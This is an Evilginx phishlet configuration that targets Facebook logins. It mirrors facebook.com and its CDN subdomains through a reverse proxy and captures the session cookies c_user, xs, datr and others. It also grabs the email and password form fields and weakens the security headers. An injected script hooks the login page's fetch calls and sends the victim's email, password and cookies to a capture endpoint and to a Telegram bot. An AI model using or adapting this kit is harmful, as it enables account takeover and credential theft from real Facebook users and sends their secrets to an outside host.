author: '@charlesbel'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin', 'presence']
    secure: true
    http_only: true
    
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
  custom: 
    - key: 'pass'
      search: '(.*)'
      type: 'post'
    - key: 'Password'
      search: '(.*)'
      type: 'post'  
    - key: 'UserAgent'
      search: '(.*)'
      type: 'post'
    - key: 'Browser'
      search: '(.*)'
      type: 'post'
    - key: 'Engine'
      search: '(.*)'
      type: 'post'
    - key: 'Platform'
      search: '(.*)'
      type: 'post'

session_capture:
  force_redirect: false
  redirect_url: "https://facebook.com"
  cookie_domain: ".facebook.com"
  secure_cookies: true
  http_only_cookies: true
   
login:
  domain: 'www.facebook.com'
  path: '/login.php'

response_headers:
  - name: 'Content-Security-Policy'
    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net data: blob:"
  - name: 'X-Frame-Options'
    value: 'ALLOW-FROM https://facebook.com'

js_inject:
  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
    trigger_params: []
    inject_delay: 2000
    cache_buster: true
    script: |  
      window._originalFetch = window.fetch;
      console.log('script injected')
      window.fetch = function(url, init) {
        if (url.includes('/login/')) {
          const formData = new URLSearchParams(init?.body || '');
          if (formData.has('email') && formData.has('pass')) {
            // Send to both Evilginx and Telegram
            Promise.all([
              fetch('/capture', {
                method: 'POST',
                body: JSON.stringify({
                  email: formData.get('email'),
                  pass: formData.get('pass'),
                  cookies: document.cookie
                }),
                keepalive: true
              }),
              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                method: 'POST',
                body: JSON.stringify({
                  chat_id: "YOUR_CHAT_ID",
                  text: `New Login\n${formData.get('email')}\n${formData.get('pass')}`
                })
              })
            ]).catch(e => console.error(e));
          }
        }
        return window._originalFetch.apply(this, arguments);
      };
